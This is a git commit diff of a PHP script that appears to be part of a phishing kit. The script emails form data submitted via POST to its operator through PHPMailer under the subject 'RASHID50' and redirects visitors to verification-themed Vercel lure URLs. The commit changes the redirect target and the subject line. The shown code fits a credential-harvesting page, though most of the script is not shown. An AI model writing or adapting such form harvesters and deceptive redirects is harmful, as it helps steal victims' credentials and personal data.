05539a636f0f2536fa48d7aade5c5a7007ae8b6e
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-20 16:26:39 +0800

    Update and rename rashid.php to rashid50.php

--- rashid50.php
+++ rashid50.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-review-page-request-on-here.vercel.app/");
+header("Location: https://for-request-team-verify-on-service.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RASHID 50';
+        $mail->Subject = 'RASHID50';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
